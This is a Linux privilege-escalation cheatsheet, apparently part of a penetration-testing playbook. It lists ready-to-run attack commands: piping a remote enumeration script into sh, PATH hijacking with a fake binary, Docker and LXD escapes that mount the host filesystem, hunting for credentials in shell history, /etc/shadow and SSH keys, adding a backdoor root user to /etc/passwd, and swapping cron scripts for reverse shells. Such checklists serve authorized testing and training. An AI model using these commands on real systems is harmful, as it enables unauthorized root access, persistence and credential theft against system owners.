# 🐧 Linux Privilege Escalation Cheatsheet

A quick checklist for finding local privilege escalation vectors on Linux machines.

## 🛠️ Automated Tools
When possible, transfer these to the target machine and run them.
* **[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)**: `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
* **[LinEnum](https://github.com/rebootuser/LinEnum)**: `bash LinEnum.sh`

## 👤 User & Group Information
* `whoami` - Current user
* `id` - Current user's groups (Look for `sudo`, `docker`, `lxd`)
* `cat /etc/passwd` - List all users
* `sudo -l` - Check what commands the current user can run as root! (Very common vector)

## 🗄️ SUID/SGID Binaries
Find binaries that execute with the permissions of the file owner (usually root).
```bash
# Find all SUID files
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```
* Cross-reference results with **[GTFOBins](https://gtfobins.github.io/)** to find known exploits.

## ⏰ Cron Jobs
Scheduled tasks often run as root with writable scripts.
```bash
# View system-wide cron jobs
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/

# Check for world-writable scripts called by cron
find /etc/cron* -writable 2>/dev/null
```
> **Attack:** If a cron job calls a script you can write to, replace it with a reverse shell payload.

## 🛤️ PATH Hijacking
If a SUID binary or cron job calls a command without an absolute path, you can exploit it.
```bash
# Check current PATH
echo $PATH

# Find binaries called without full path (e.g., in a SUID script)
strings /usr/local/bin/suid-binary | grep -v '/'

# Attack: create a malicious binary and prepend your dir to PATH
echo '/bin/bash -p' > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
```

## ⚡ Linux Capabilities
Capabilities grant specific root-like privileges to binaries without a full SUID bit.
```bash
# Find binaries with capabilities set
getcap -r / 2>/dev/null
```
* Dangerous capabilities: `cap_setuid`, `cap_net_raw`, `cap_dac_override`
* Cross-reference with **[GTFOBins](https://gtfobins.github.io/)** (filter by "capabilities").

## 📂 World-Writable Files & Directories
```bash
# Find world-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Find world-writable directories
find / -writable -type d 2>/dev/null
```

## 🐳 Docker / LXD Group Abuse
If your user is in the `docker` or `lxd` group, you effectively have root.
```bash
# Check group membership
id

# Docker escape to root filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# LXD abuse: import a small Alpine image and mount host filesystem
lxc init ubuntu:16.04 priv -c security.privileged=true
lxc config device add priv mydevice disk source=/ path=/mnt/root recursive=true
lxc start priv
lxc exec priv /bin/sh
```

## 🔑 Credential Hunting
Search for hardcoded passwords and keys left behind by admins.
```bash
# Shell history files
cat ~/.bash_history
cat ~/.zsh_history

# Config files containing the word "password"
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null

# SSH private keys
find / -name "id_rsa" -o -name "id_ecdsa" 2>/dev/null

# Check /etc/shadow if readable (already root-level access)
cat /etc/shadow
```

## 🪪 Writable /etc/passwd
If `/etc/passwd` is world-writable, you can add a new root-level user directly.
```bash
# Check permissions
ls -la /etc/passwd

# Generate a password hash (run on your attacker machine)
openssl passwd -1 -salt root hacked

# Append a new root user (replace HASH_HERE with the output above)
echo 'hacker:$1$root$HASH_HERE:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker   # password: hacked
```

## 💣 Kernel Exploits
Use only as a last resort — exploits may crash or destabilize the system.
```bash
# Get kernel version
uname -a
cat /proc/version

# Search for public exploits
searchsploit linux kernel $(uname -r)
```
* **Notable CVEs:** Dirty COW (`CVE-2016-5195`), DirtyPipe (`CVE-2022-0847`), Looney Tunables (`CVE-2023-4911`)

---
*Return to [SimplySec Playbook](../README.md)*
